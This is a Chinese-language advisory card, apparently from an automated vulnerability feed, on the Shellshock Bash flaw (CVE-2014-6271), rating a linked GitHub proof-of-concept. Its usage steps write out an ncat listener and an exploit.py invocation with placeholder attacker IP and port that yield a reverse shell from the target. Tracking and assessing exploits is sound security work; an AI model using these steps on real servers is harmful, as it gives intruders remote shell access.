## CVE-2014-6271 - Bash RCE

**漏洞编号:** CVE-2014-6271

**漏洞类型:** RCE

**影响应用:** Bash

**危害等级:** Critical

**CVSS评分:** 9.8

**影响版本:** 1.14 to 4.3

**利用条件:** 需要目标系统存在CGI脚本，允许通过HTTP请求设置User-Agent头。

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 15%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于Bash shell中的远程代码执行漏洞。该漏洞源于Bash在处理环境变量定义时，允许在函数定义后附加任意命令，导致在CGI脚本等场景下，攻击者可以通过构造恶意环境变量来执行任意代码。本POC利用了该漏洞通过修改HTTP请求的User-Agent头来执行命令。

POC有效性分析：
该POC的有效性较高，通过修改HTTP请求的User-Agent头，即可触发漏洞。该POC包含了一个完整的利用脚本，可以方便地进行测试和验证。脚本通过构造包含恶意代码的User-Agent头，向目标服务器发送HTTP请求。如果目标服务器上的CGI脚本使用Bash shell来处理请求，恶意代码就会被执行，从而实现远程代码执行。该POC使用了Python3编写，结构清晰，易于理解和修改。脚本包含必要的参数，如目标IP地址、URI、攻击者IP地址和端口号，方便用户根据实际情况进行配置。脚本通过`requests`库发送HTTP请求，并根据响应状态码判断是否执行成功。

利用步骤：
1. 确保目标系统存在CGI脚本，并且该脚本使用Bash shell进行处理。
2. 使用NetCat监听攻击者机器上的指定端口：`ncat -lkvnp <attacker-port>`
3. 运行exploit.py脚本，指定目标IP地址、URI、攻击者IP地址和端口号：`python3 ./exploit.py -t <target-ip:str> -u <uri:str> -a <attacker-ip:str> -p <port:int>`
4. 检查NetCat监听端口，如果漏洞利用成功，将会收到来自目标系统的反向shell。

投毒风险分析：
此POC脚本主要功能是利用Shellshock漏洞执行命令，其代码逻辑清晰，主要依赖于Python标准库requests。虽然脚本执行了网络请求并可以执行任意代码，但其目的在于验证和利用漏洞，不包含主动的恶意行为。该脚本没有包含任何混淆代码或恶意载荷，也没有连接任何外部恶意资源。脚本使用了f-string进行字符串格式化，虽然存在一定的代码注入风险，但这是为了构建Payload, 不视为投毒。该POC的投毒风险较低，但用户需要注意，在实际使用过程中，应避免将该POC用于非法用途。

**项目地址:** https://github.com/jordanpotti/Shellshock-Exploit

**漏洞详情:** https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-6271
